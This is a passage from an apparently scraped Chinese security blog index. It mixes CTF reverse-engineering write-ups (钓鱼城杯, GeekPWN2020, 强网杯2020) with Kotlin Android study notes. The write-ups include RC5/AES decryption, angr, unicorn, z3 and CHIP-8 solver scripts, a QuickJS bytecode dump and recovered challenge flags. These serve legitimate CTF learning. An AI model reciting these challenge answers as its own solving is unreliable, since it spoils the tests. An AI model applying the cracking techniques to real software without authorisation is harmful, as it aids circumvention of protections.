+ self.S[1]) % self.mod for i in range(1, self.R + 1): A = (self.__lshift((A ^ B), B) + self.S[2 * i]) % self.mod B = (self.__lshift((A ^ B), A) + self.S[2 * i + 1]) % self.mod return (A.to_bytes(self.w8, byteorder='little') + B.to_bytes(self.w8, byteorder='little')) def decryptBlock(self, data): A = int.from_bytes(data[:self.w8], byteorder='little') B = int.from_bytes(data[self.w8:], byteorder='little') for i in range(self.R, 0, -1): B = self.__rshift(B - self.S[2 * i + 1], A) ^ A A = self.__rshift(A - self.S[2 * i], B) ^ B B = (B - self.S[1]) % self.mod A = (A - self.S[0]) % self.mod return (A.to_bytes(self.w8, byteorder='little') + B.to_bytes(self.w8, byteorder='little')) def encryptFile(self, inpFileName, outFileName): with open(inpFileName, 'rb') as inp, open(outFileName, 'wb') as out: run = True while run: text = inp.read(self.w4) if not text: break if len(text) != self.w4: text = text.ljust(self.w4, b'\\x00') run = False text = self.encryptBlock(text) out.write(text) def decryptFile(self, inpFileName, outFileName): with open(inpFileName, 'rb') as inp, open(outFileName, 'wb') as out: while True: text = inp.read(self.w4) if not text: break text = self.decryptBlock(text) if self.strip_extra_nulls: text = text.rstrip(b'\\x00') out.write(text) def encryptBytes(self, data): res, run = b'', True while run: temp = data[:self.w4] if le","date":"2020-10-20","objectID":"/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-mobile%E9%A2%98%E8%A7%A3/:2:0","tags":null,"title":"钓鱼城杯-mobile题解","uri":"/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-mobile%E9%A2%98%E8%A7%A3/"},{"categories":["writeup"],"content":"exp #!/usr/bin/env python from Crypto.Cipher import AES from Crypto.Util.number import * from RC5 import RC5 import struct datalist = [202 , 96 , 85 , 48 , 181 , 219 , 212 , 166 , 1 , 21 , 63 , 184 , 188 , 76 , 156 , 136 , 234 , 244 , 118 , 221 , 141 , 123 , 26 , 38 , 218 , 116 , 44 , 29 , 40 , 99 , 75 , 136 , 68 , 34 , 126 , 33 , 14 , 108 , 244 , 174 , 228 , 33 , 199 , 103 , 33 , 64 , 197 , 59 , 178 , 85 , 146 , 33 , 155 , 41 , 250 , 51] data = bytes(datalist) print(data,len(data)) key = b'\\x02'*32 rc5 = RC5(32, 12, key) result = rc5.decryptBytes(data) print('xxx\\n') for r in result: print(hex(int(r)), end=\",\") print('end\\n') key = b'\\x01'*16 cipher = AES.new(key, AES.MODE_ECB) msg = cipher.decrypt(result) print(msg) # flag{AES_and_rc5_modified_in_jni_onloadXDDD} 一个RC系列实现的文章 ","date":"2020-10-20","objectID":"/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-mobile%E9%A2%98%E8%A7%A3/:3:0","tags":null,"title":"钓鱼城杯-mobile题解","uri":"/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-mobile%E9%A2%98%E8%A7%A3/"},{"categories":["notes"],"content":"Kotlin一些特性 var: 变量，val:常量 定义变量时，可在类型后面加一个问号?，表示该变量是Nullable，不加表示该变量不可为null 扩展(好神奇) 继承 object: 类似java的匿名内部类 companion：Kotlin给Java开发者带来最大改变之一就是废弃了static修饰符。与Java不同的是在Kotlin的类中不允许你声明静态成员或方法。相反，你必须向类中添加Companion对象来包装这些静态引用 ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:1:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"参考 https://www.bilibili.com/video/BV1654y1X7Jo?from=search\u0026seid=7649962615194993068 因为最近的项目需要Android开发的基础比较高，准备学习一下kotlin，先学习的是这个视频中的内容，在这里做个笔记。 ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:2:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"模块化 模块化的作用 业务分离 通用化，代码复用 如何实现模块化 公用模块抽取 业务模块抽取 主工程组装业务模块 模块间的通讯 跨模块跳转 跨模块接口调用 ARouter路由框架(alibaba) ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:3:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"MVP架构 MVP 全称：Model - View - Presenter Model 表示数据层，View 表示视图层，Presenter 表示逻辑处理层 在 MVP 模式中 View 不和 Model 进行直接交互，View 通过 Presenter 将前端数据传给 Model，或者通过 Presenter 从 Model 中获取数据，View 和 Model 所有的交互都发生在 Presenter 中 View 负责前端的展示以及与用户的交互 Model 负责数据的存储以及调用 好处：能够有效解耦工程，分为各个独立模块，功能清晰，有利于重复使用，在调试过程中也能够快速定位错误 缺陷：增加代码工作量 https://www.viseator.com/2017/05/25/android_google_mvp/ ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:4:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"技术选型 ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:5:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"视图层 kotlin-android-extensions Butterknife ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:5:1","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"业务层 RxKotlin RxAndroid RxLifecycle ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:5:2","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"其他 Dagger2（依赖注入） Gson（数据路由） ARouter（模块路由） Glide（图片加载） takephoto（图片选择） 七牛（数据云存储） MultiStateView（多状态视图） bga-refreshlayout（上下拉刷新） ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:5:3","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"Application与Library ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:6:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"启动 Application作为应用程序启动: apply plugin: ‘com.android.application’ Library作为库工程被引用: apply plugin: ‘com.android.library’ ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:6:1","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"切换 if(xxx.toBoolean()){ apply plugin: 'com.android.library' }else{ apply plugin: 'com.android.application' } ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:6:2","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"两套AndroidManifest 一套用于Application时使用，配置主题及默认启动，位于debug目录 一套用于Library时使用，注册组件及权限，位于release目录 ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:6:3","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"AndroidManifest的切换 sourceSers{ main{ if(xxx.toBoolean()){ mainfest.srcFile 'src/main/release/AndroidManifest.xml' }else{ mainfest.srcFile 'src/main/debug/AndroidManifest.xml' } } } ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:6:4","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"android-extensions介绍 视图绑定，可直接使用XML中ID操作该控件 插件级别，无需引入第三方库 无需定义变量，极大减少代码 适用于Activity, Fragment, Adapter及自定义View ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:7:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"Anko Anko组成部分： Anko Commons Anko Layouts Anko SQLite：数据库 Anko Coroutines: 协程 ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:8:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"RxJava 下面这个是两个作者写的RxJava2.0的一系列教程 https://maxwell-nc.github.io/categories.html https://www.jianshu.com/u/c50b715ccaeb ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:9:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"Retrofit 官方网址：https://square.github.io/retrofit/ ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:10:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["notes"],"content":"Dagger2:依赖注入 @Inject和@Component @Module和@Provides @Scope和@Singleton @Qualifier和@Named 依赖注入的含义： 正常版： class ClassB{ fun sayHello(){ println(\"hello\") } } class ClassA{ var mClassB: ClassB init{ mClassB = ClassB() } fun doSomething(){ mClassB.sayHello() } } 依赖注入版： class ClassB @Inject constructor{ fun sayHello(){ println(\"hello\") } } class ClassA{ @Inject lateinit var mClassB: ClassB fun doSomething(){ mClassB.sayHello() } } @Component 注入器，连接目标类和依赖实例的桥梁 以@Component标注的类必须是接口或者抽象类 Component依赖关系通过dependencier属性添加 App必须有一个Component用来管理全局实例 @Module 第三方库无法修改，不能在其构造函数添加@Inject 接口不能实例化， 只能通过实现类实例化 Module是一个简单工厂，创建类实例的方法 Component通过Modules属性加入多个Module @Proivides 在Module中，使用@Provides标注创建实例的方法 实例化流程 – Component搜索@Inject注解的属性 – Component查找Module中以@Provides注解的对应方法，创建实例 Inject和Module维度 Module优先级高于Inject构造函数 查找到实例对象，依次查看其参数实例化 Module中存在创建实例方法，停止查找Inject维度，如果没有，查找Inject构造函数 ","date":"2020-09-13","objectID":"/kotlin-android%E5%BC%80%E5%8F%91/:11:0","tags":null,"title":"Kotlin开发","uri":"/kotlin-android%E5%BC%80%E5%8F%91/"},{"categories":["writeup"],"content":"12. androidcmd 程序被平坦化了，尝试去掉混淆没成功，只能直接看了。 首先在sub_10BC中进行了md5值的验证，可以直接把f5后的代码写进.c文件，加上一个验证的main函数，用angr求解(后来发现其实字符串是直接用字符相等验证的) ...... int main() { char s[40]; scanf(\"%s\", s); if(sub_848(s) == 0) printf(\"Right\\n\"); else printf(\"Wrong\\n\"); } 求解脚本： import angr, sys def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) # (1) if b'Right' in stdout_output: # (2) return True # (3) else: return False def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b'Wrong' in stdout_output: return True else: return False def main(): filename = \"test\" proj = angr.Project(filename) initial_state = proj.factory.entry_state() simgr = proj.factory.simgr(initial_state) simgr.explore(find=is_successful, avoid=should_abort) if simgr.found: solution = simgr.found[0] print(solution.posix.dumps(sys.stdin.fileno())) if __name__ == \"__main__\": main() 求解出来md5的一部分是:“94bda84799d” 后面的验证部分跟求md5的一样，字符格式是82600087-****-4524-9eaa-69646e04bf68中间差了4字节需要用md5来爆破一下。注意求md5的字符串后面需要加上换行符…不然出不来结果 ","date":"2020-08-30","objectID":"/geekpwn2020-%E9%83%A8%E5%88%86re/:1:0","tags":null,"title":"GeekPWN2020-部分re","uri":"/geekpwn2020-%E9%83%A8%E5%88%86re/"},{"categories":["writeup"],"content":"13. babyre 加密过程如下： consts = xxx j = 0 for i in range(0, 32, 8): a=consts^(flag[i] | (flag[i+2]\u003c\u003c8)) buf[j]=(a\u00260xffff)^nums[j] j = j + 1 b=consts^(flag[i+1] | (flag[i+3]\u003c\u003c8)) buf[j]=(b\u00260xffff)^nums[j] j = j + 1 c=consts^(flag[i+7] | (flag[i+4]\u003c\u003c8)) buf[j]=(c\u00260xffff)^nums[j] j = j + 1 d=consts^(flag[i+6] | flag[i+5] \u003c\u003c 8) buf[j]=(d\u00260xffff)^nums[j] j = j + 1 consts=consts ^ buf[j-1] ^ buf[j-2] ^ buf[j-3] ^ buf[j-4] a=consts^(flag[32] | flag[35]\u003c\u003c 8)^0xFFFFBF9E buf[j]=(a\u00260xffff) j = j + 1 a = (flag[33] \u003c\u003c 8 | flag[34]) ^ consts ^ 0xFA2C buf[j]=(a\u00260xffff) 首先要求出加密用的常数，这个常数是根据main函数的部分异或算出来的，所以不能通过调试的方式得到，可以使用unicorn求得常数的值: #coding=utf-8 from unicorn import * from unicorn.x86_const import * mu = Uc (UC_ARCH_X86, UC_MODE_64) BASE = 0x400000 STACK_ADDR = 0x0 STACK_SIZE = 1024*1024 mu.mem_map(BASE, 1024*1024) # 初始化存储空间 mu.mem_map(STACK_ADDR, STACK_SIZE) # 初始化栈空间 mu.mem_write(BASE, read(\"./babyre\")) # 加载程序 mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - 1) def hook_code(mu, address, size, user_data): if address == 0x4054A9: c = mu.reg_read(UC_X86_REG_RBX) print(hex(c)) mu.hook_add(UC_HOOK_CODE, hook_code) mu.emu_start(0x40546B, 0x4054B0) 这里得到的是v5,进行下面的操作后是const: def HIDWORD(a): b = a \u0026 0xffffffff00000000 b = b \u003e\u003e 32 return b consts = (v5\u00260xffffffff) ^ ((v5\u00260xffffffff) \u003e\u003e 16) ^ HIDWORD(v5) ^ (v5 \u003e\u003e 48) 得到常数后直接解密就行： nums = [7107, 2676, 52815, 3666, 54091, 28777, 35367, 10586, 25358, 65063, 6311, 24454, 42823, 33695, 16895, 7107, 49054, 64044] enc = [55568, 49906, 1737, 38871, 50041, 14151, 40283, 30065, 9059, 61980, 19841, 3054, 26730, 6325, 56961, 34785, 23561, 8122] def dec(consts): const_list = [] for i in range(0,16,4): const_list.append(consts) consts=consts^enc[i]^enc[i+1]^enc[i+2]^enc[i+3] const_list.append(consts) j = 0 for i in range(4): consts=const_list[i] for j in range(4*i, 4*i+4): enc[j]=enc[j]^nums[j] enc[j]=enc[j]^consts enc[j]=enc[j]\u00260xffff enc[16] = enc[16] ^ 0xFFFFBF9E enc[16] = enc[16] ^ const_list[-1] enc[16] = enc[16] \u0026 0xffff enc[17] = enc[17] ^ 0xFA2C enc[17] = enc[17] ^ const_list[-1] enc[17] = enc[17] \u0026 0xffff if __name__ == \"__main__\": dec(0x64e2fbe3) s = \"\".join(hex(i)[2:].zfill(2) for i in enc) print(bytes.fromhex(s).decode('utf-8')) 解密以后需要根据加密调整一下字符的顺序 ","date":"2020-08-30","objectID":"/geekpwn2020-%E9%83%A8%E5%88%86re/:2:0","tags":null,"title":"GeekPWN2020-部分re","uri":"/geekpwn2020-%E9%83%A8%E5%88%86re/"},{"categories":["writeup"],"content":"wtclwtclwtcl拖后腿一级选手哭 ","date":"2020-08-30","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-%E9%83%A8%E5%88%86re/:0:0","tags":null,"title":"强网杯2020-部分re","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-%E9%83%A8%E5%88%86re/"},{"categories":["writeup"],"content":"xx_warmup_obf 加了混淆不能直接f5，但是很容易能找到各种乘法和比较的区域，猜测是check的代码，算出第一个字符是f，所以就是解方程。汇编手抄有点麻烦，可以将每个jz指令和jz的目的地址之间的代码直接nop，这样就能f5了，复制出来稍微修改一下即可。 from z3 import * solver = Solver() s = [Int('s%i' % i) for i in range(0x1c)] solver.add(23925 * s[0] == 2440350 ) solver.add(281400 * s[1] - 7037 * s[0] == 29673426 ) solver.add(174826 * s[0] - 255300 * s[2] - 283573 * s[1] == -37557732 ) solver.add(259881 * s[2] + -98445 * s[1] - 276718 * s[0] + 4524 * s[3] == -13182867 ) solver.add(285576 * s[2] + -274569 * s[3] + 94721 * s[0] - 228216 * s[4] - 60353 * s[1] == -25506885 ) solver.add(260927 * s[3] + -5496 * s[1] + -294195 * s[4] + 264844 * s[2] + 125853 * s[5] - 153661 * s[0] == 13075233 ) solver.add(17630 * s[0] + -258397 * s[3] + -244952 * s[1] + -244086 * s[2] + -130259 * s[5] - 190371 * s[6] - 109961 * s[4] == -111027477 ) solver.add(117817 * s[5] + 268397 * s[7] + -198175 * s[1] + 18513 * s[2] + 218992 * s[6] + -6727 * s[3] + 228408 * s[0] + 224658 * s[4] == 78775012 ) solver.add(-288418 * s[3] + -218493 * s[7] + -236774 * s[0] + 77982 * s[2] + 190784 * s[4] + -84462 * s[1] + 92684 * s[8] + 52068 * s[5] - 243023 * s[6] == -52520267 ) solver.add(-196269 * s[8] + -64473 * s[7] + -142792 * s[5] + 171321 * s[4] + -39259 * s[9] + -269632 * s[2] + 229049 * s[6] + 96631 * s[3] - 280754 * s[1] - 168397 * s[0] == -70797046 ) solver.add(-235026 * s[4] + 162669 * s[8] + -256202 * s[1] + -32946 * s[9] + -25900 * s[2] + 195039 * s[10] + 182157 * s[3] + 292706 * s[0] + -93524 * s[5] + 121516 * s[6] + 165207 * s[7] == 28263339 ) solver.add(-131770 * s[6] + -92964 * s[9] + -111160 * s[8] + -258188 * s[7] + 133728 * s[1] + -272650 * s[5] + -4940 * s[10] + 272791 * s[3] + 80519 * s[2] + -165434 * s[11] + 50166 * s[0] + 148713 * s[4] == -22025185 ) solver.add(-262820 * s[4] + 9710 * s[10] + 71182 * s[12] + -184125 * s[1] + -100280 * s[6] + 62018 * s[11] + 141532 * s[9] + -138253 * s[8] + 20489 * s[0] + -214348 * s[2] + 162962 * s[3] - 93199 * s[7] + 147171 * s[5] == -31396844 ) solver.add(-55254 * s[8] + 220404 * s[12] + -86956 * s[10] + -200702 * s[5] + -51437 * s[1] + 25739 * s[6] + 122945 * s[3] + 116256 * s[7] + 22859 * s[4] + -61880 * s[9] + -119275 * s[2] + -224754 * s[13] - 75412 * s[0] + 59999 * s[11] == -37063008 ) solver.add(111310 * s[0] + 198502 * s[3] + -189890 * s[13] + 278745 * s[5] + 157462 * s[9] + 135809 * s[4] + -2621 * s[2] + 67553 * s[6] + 144834 * s[1] + -88326 * s[11] + -228149 * s[10] + 233663 * s[14] + -249960 * s[12] + 300012 * s[8] + 91783 * s[7] == 93457153 ) solver.add(15897 * s[0] + -11943 * s[13] + 194067 * s[3] + 125666 * s[2] + 104421 * s[12] + -181764 * s[5] + -233813 * s[8] + -235783 * s[4] + 230636 * s[11] + 148005 * s[6] + -48167 * s[14] + -163572 * s[9] + 54553 * s[10] + -129997 * s[1] + 114175 * s[7] - 251681 * s[15] == -36640750 ) solver.add(-90549 * s[3] + -228520 * s[14] + 34835 * s[10] + -203538 * s[15] + 272318 * s[13] + -68478 * s[8] + 22454 * s[9] + 74128 * s[12] + 70051 * s[6] + -289940 * s[7] + -52501 * s[5] + -1254 * s[4] + 154844 * s[11] + 254969 * s[2] + -39495 * s[1] + 277429 * s[16] - 132752 * s[0] == -6628237 ) solver.add(128092 * s[11] + -5873 * s[17] + -144172 * s[3] + -148216 * s[13] + 189050 * s[2] + 66107 * s[5] + 237987 * s[0] + -53271 * s[9] + -86968 * s[12] + -94616 * s[10] + -247882 * s[8] + -5107 * s[1] + 55085 * s[15] + 10792 * s[14] + -112241 * s[4] + -36680 * s[16] - 210718 * s[7] - 249539 * s[6] == -53084017 ) solver.add(-186088 * s[2] + 19517 * s[13] + -65515 * s[5] + 195447 * s[1] + 145470 * s[14] + 58825 * s[16] + 272227 * s[15] + -155443 * s[8] + 100397 * s[3] + -238861 * s[18] + 84628 * s[7] + 1337 * s[17] + 156976 * s[12] + -74209 * s[4] + 175077 * s[11] + 134548 * s[0] + -280672 * s[6] + 12264 * s[10] + 56937 * s[9] == 60764977 ) solver.add(-58873 * s[7] + -283834 * s[9] + 159144 * s[13] + -199631 * s[0] + 54404 * s[16] + -190345 * s[8] + 176103 * s[3] + 137206 * s[17] + -170051 * s[6] + 281718 * s[11] + 137214 * s[14] + -104395 * s[19] + -122090 * s[4] + 162065 * s[15] + -36580 * s[18","date":"2020-08-30","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-%E9%83%A8%E5%88%86re/:0:1","tags":null,"title":"强网杯2020-部分re","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-%E9%83%A8%E5%88%86re/"},{"categories":["writeup"],"content":"imitation_game first part: AES加密，CBC模式 # -*- coding:utf-8 -*- from Crypto.Cipher import AES import binascii def padding(s,n): len1 = len(s) n1 = len1 % n s += chr(0x1a)*(49-n1) s += chr(0)*(0x40-len(s)) return s def de_aes_cbc(s,k): if len(s) % 16 != 0: s = padding(s,16) key = k iv = \" !\\\"#$%\u0026'()*+,-./\" ci = AES.new(key,AES.MODE_CBC,iv) return ci.decrypt(s) def en_aes_cbc(s,k): s = padding(s,0x40) key = k iv = \" !\\\"#$%\u0026'()*+,-./\" print(len(k), len(iv)) ci = AES.new(key,AES.MODE_CBC,iv) return ci.encrypt(s) target = [0x9D, 0x7B, 0xA2, 0x3C, 0xB1, 0x09, 0x9A, 0x48, 0x41, 0xD1, 0x66, 0x63, 0xD6, 0xAE, 0x3C, 0xAB, 0x1F, 0x44, 0x0E, 0x33, 0xFB, 0xB5, 0xB8, 0xA9, 0x02, 0x65, 0x83, 0xD9, 0x47, 0x30, 0x6D, 0x24, 0xB0, 0x75, 0x79, 0xD5, 0xCC, 0x80, 0x0E, 0x67, 0x11, 0x62, 0x4C, 0xF1, 0xF5, 0xAF, 0x9E, 0x69, 0x93, 0x69, 0x7C, 0x48, 0xAD, 0xD3, 0x45, 0x29, 0x68, 0xBA, 0xED, 0x9A, 0x70, 0xA0, 0xD1, 0x0D] strs = \"\".join(chr(i) for i in target) print(de_aes_cbc(strs,\"\\x3E\\x2C\\x25\\x13\\x18\\xBE\\xC3\\x6B\\xA1\\x37\\x24\\x53\\x03\\x1E\\x51\\xEC\").rstrip(chr(0x1a))) # 6c8f1d78770fe672122478c6f9a150e0 second part: https://github.com/mattmikolay/chip-8/wiki/CHIP%E2%80%908-Instruction-Set https://www.anquanke.com/post/id/172217#h3-6 https://github.com/cj1128/chip8-emulator 后半段启动了一个chip-8模拟器，加载game.bin运行一个游戏。输入10个16进制数进行校验。 题目模拟器的逻辑和https://github.com/cj1128/chip8-emulator基本类似，只有ret指令的实现和chip8-emulator不同。 安全客有篇文章提供了chip-8 IDA processor，加载之后可以反汇编看题目的逻辑。 首先获得10个输入，输出到屏幕上，输入存储在v0-v9寄存器上；之后首先对10个输入逐个做加法或者异或操作，再三个一组的做乘法求和；最后校验乘法和是否和固定值相等。写脚本爆破就能获得后半段flag。 cmp_list = [0x21, 0x2a, 0x30, 0x37, 0x37, 0x3b, 0x1f, 0x16, 0x20, ] multi_list = [ [1, 2, 1], [2, 1, 1], [1, 2, 2], [1, 2, 1], [2, 1, 1], [1, 2, 2], [1, 2, 1], [2, 1, 1], [1, 2, 2] ] flag = \"6c8f1d78770fe672122478c6f9a150e0\" for n in xrange(3): for i in xrange(32): for j in xrange(32): for k in xrange(32): if n == 0: x = i + 2 y = j + 1 z = (k+1) ^ 1 if n == 1: x = i + 3 y = j + 2 z = (k^2)+1 if n == 2: x = i + i y = j + 1 z = (k^1)+1 if cmp_list[3*n] == x * multi_list[3*n][0] + y * multi_list[3*n][1] + z * multi_list[3*n][2] \\ and cmp_list[3*n+1] == x * multi_list[3*n+1][0] + y * multi_list[3*n+1][1] + z * multi_list[3*n+1][2] \\ and cmp_list[3*n+2] == x * multi_list[3*n+2][0] + y * multi_list[3*n+2][1] + z * multi_list[3*n+2][2] : print \"%x%x%x\" % (i, j, k) flag += \"%x%x%x\" % (i, j, k) flag += \"3\" print \"%s\" % flag ","date":"2020-08-30","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-%E9%83%A8%E5%88%86re/:0:2","tags":null,"title":"强网杯2020-部分re","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-%E9%83%A8%E5%88%86re/"},{"categories":["writeup"],"content":"这个题是仿照kctf2020的一道题出的，就是quickjs的版本不一样。 打开搜索字符串可以看到使用了QucikJS, 版本是2020-07-05 主要逻辑如下： puts(\"Please input flag:\"); gets(\u0026s); v7 = strlen(\u0026s); v3 = 0x2A; if ( v7 \u003c= 0x2A ) v3 = v7; memcpy(\u0026unk_6CF4E9, \u0026s, v3); rt = sub_40D500(); sub_487A60(rt); ctx = (_QWORD *)sub_4746F0(rt); sub_40EA30(rt, 0LL, (__int64)sub_4875C0, 0LL); sub_476860(ctx); sub_4762F0(ctx); sub_476390(ctx); sub_474DE0(ctx); sub_474E50(ctx); sub_475BC0(ctx); sub_475BE0(ctx); sub_475CC0(ctx); sub_479330(ctx); sub_475EC0(ctx); sub_4764B0(ctx); sub_4878A0(ctx, a1, a2); sub_4886E0((__int64)ctx, (char *)\u0026unk_6CF4E0, 662LL, 0); sub_4884F0(ctx); sub_40BD80(ctx); sub_40CEB0(rt); return 0LL; 其中unk_6CF4E0处存储的是js编译后的二进制代码，数组长度是662. QucikJS编译以后有一个hello.c文件, 其与我们反编译的逻辑基本一致，所以只需要将qjsc_hello数组替换成unk_6CF4E0的内容即可。 /* File generated automatically by the QuickJS compiler. */ #include \"quickjs-libc.h\" #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e const uint32_t qjsc_s_size = 662; uint8_t qjsc_s[662] = {2, 14, 2, 97, 2, 98, 2, 105, 84, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 2, 99, 20, 99, 104, 97, 114, 67, 111, 100, 101, 65, 116, 2, 106, 8, 112, 117, 115, 104, 2, 109, 2, 110, 2, 115, 24, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 10, 112, 114, 105, 110, 116, 16, 104, 101, 108, 108, 111, 46, 106, 115, 14, 0, 6, 0, 160, 1, 0, 1, 0, 32, 0, 5, 222, 3, 1, 162, 1, 0, 0, 0, 63, 224, 0, 0, 0, 0, 63, 225, 0, 0, 0, 0, 63, 226, 0, 0, 0, 0, 62, 224, 0, 0, 0, 0, 62, 225, 0, 0, 0, 0, 62, 226, 0, 0, 0, 0, 4, 227, 0, 0, 0, 17, 57, 224, 0, 0, 0, 202, 38, 0, 0, 17, 57, 225, 0, 0, 0, 202, 190, 94, 190, 85, 190, 93, 190, 38, 190, 51, 190, 55, 190, 110, 190, 13, 190, 25, 191, 186, 0, 191, 249, 0, 191, 210, 0, 191, 174, 0, 191, 204, 0, 191, 204, 0, 190, 42, 190, 8, 190, 104, 190, 81, 191, 149, 0, 191, 240, 0, 191, 146, 0, 190, 126, 190, 100, 190, 25, 191, 158, 0, 191, 236, 0, 190, 38, 190, 101, 191, 177, 0, 191, 221, 0, 191, 155, 0, 38, 32, 0, 190, 90, 76, 32, 0, 0, 128, 190, 26, 76, 33, 0, 0, 128, 191, 222, 0, 76, 34, 0, 0, 128, 190, 99, 76, 35, 0, 0, 128, 190, 121, 76, 36, 0, 0, 128, 191, 163, 0, 76, 37, 0, 0, 128, 191, 229, 0, 76, 38, 0, 0, 128, 190, 74, 76, 39, 0, 0, 128, 190, 77, 76, 40, 0, 0, 128, 191, 180, 0, 76, 41, 0, 0, 128, 17, 57, 228, 0, 0, 0, 202, 6, 202, 182, 17, 57, 226, 0, 0, 0, 14, 56, 226, 0, 0, 0, 56, 224, 0, 0, 0, 234, 164, 235, 78, 56, 224, 0, 0, 0, 66, 229, 0, 0, 0, 56, 226, 0, 0, 0, 36, 1, 0, 17, 57, 230, 0, 0, 0, 202, 56, 225, 0, 0, 0, 66, 231, 0, 0, 0, 56, 230, 0, 0, 0, 56, 226, 0, 0, 0, 56, 226, 0, 0, 0, 155, 190, 56, 158, 191, 255, 0, 174, 175, 36, 1, 0, 202, 56, 226, 0, 0, 0, 146, 57, 226, 0, 0, 0, 14, 237, 166, 183, 17, 57, 232, 0, 0, 0, 202, 182, 17, 57, 233, 0, 0, 0, 202, 6, 202, 56, 225, 0, 0, 0, 66, 55, 0, 0, 0, 36, 0, 0, 56, 228, 0, 0, 0, 66, 55, 0, 0, 0, 36, 0, 0, 170, 235, 12, 192, 0, 17, 57, 233, 0, 0, 0, 202, 237, 10, 192, 1, 17, 57, 233, 0, 0, 0, 202, 194, 17, 57, 234, 0, 0, 0, 202, 6, 202, 56, 233, 0, 0, 0, 192, 2, 166, 235, 58, 56, 234, 0, 0, 0, 56, 152, 0, 0, 0, 66, 235, 0, 0, 0, 56, 151, 0, 0, 0, 56, 233, 0, 0, 0, 192, 3, 157, 240, 36, 1, 0, 158, 17, 57, 234, 0, 0, 0, 202, 56, 233, 0, 0, 0, 192, 4, 156, 17, 57, 233, 0, 0, 0, 202, 237, 190, 56, 236, 0, 0, 0, 56, 234, 0, 0, 0, 240, 206, 40, 218, 3, 1, 23, 91, 0, 18, 8, 63, 53, 0, 162, 1, 2, 123, 128, 193, 75, 43, 44, 213, 48, 43, 63, 203, 78, 13, 10, 232, 1, 7, 68, 184, 144, 181, 107, 103, 128, 10, 232, 1, 7, 52, 167, 184, 72, 127, 141, 175, 10, 0, 10, 40, 1, 254, 10, 40, 1, 254}; int main(int argc, char **argv) { char un[0x2a] = {0}; char* unpos = \u0026qjsc_s[9]; int unlen; printf(\"Please input flag:\"); gets(un); unlen = strlen(un) \u003e 0x2a? 0x2a, strlen(un); memcpy(unpos, un, unlen); 